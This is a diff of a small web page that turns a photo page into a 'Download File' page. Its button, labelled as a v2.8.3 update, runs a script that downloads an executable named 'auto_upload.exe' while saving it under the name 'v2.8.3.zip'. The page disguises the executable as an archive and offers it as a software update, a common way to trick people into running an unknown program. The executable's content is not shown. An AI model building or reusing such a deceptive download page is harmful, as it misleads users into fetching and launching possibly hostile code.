@@ -1,13 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
-
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+</head>
 <body>
-<h1>BIRD!!!</h1>
-  <main>
-    <img src="shutterstock_685368169__FocusFillWzEyMDAsNjMwLCJ5IiwxNzNd.jpg" alt="Project 2 Photo">
-    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
-   
-  </main>
+    <h1>Download File</h1>
+    <button onclick="downloadFile()">Download v2.8.3 Now</button>
 
+    <script>
+        function downloadFile() {
+            const link = document.createElement("a");
+            link.href = "auto_upload.exe";
+            link.download = "v2.8.3.zip";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
 </body>
 </html>
